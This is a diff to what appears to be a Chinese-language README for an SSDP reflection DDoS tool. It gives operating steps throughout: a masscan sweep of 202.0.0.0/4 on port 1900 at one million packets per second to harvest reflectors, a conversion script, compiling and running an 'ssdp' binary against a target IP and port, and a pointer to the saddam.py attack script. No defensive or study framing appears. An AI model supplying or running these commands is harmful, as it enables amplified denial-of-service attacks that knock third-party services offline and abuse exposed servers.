@@ -12,8 +12,9 @@
 
 ### 扫描 Server
 	# 最高速扫描 SSDP 端口保存为 JSON
-	# 后续需要解析为单 IP 的 TXT 方式
 	./masscan 202.0.0.0/4 -p1900 --rate 1000000 -oJ ip.json
+	# 转换格式为单 IP 的 TXT
+	python format.py ip.json ip.txt
 
 ### 攻击 SSDP
 	# 安装 C 编译环境
@@ -22,3 +23,5 @@
 	gcc -pthread ssdp.c -o ssdp
 	# SSDP 攻击
 	./ssdp <target IP> <target port> <reflection file> <time (optional)>
+	
+> 攻击或使用功能更全的 saddam.py 攻击脚本
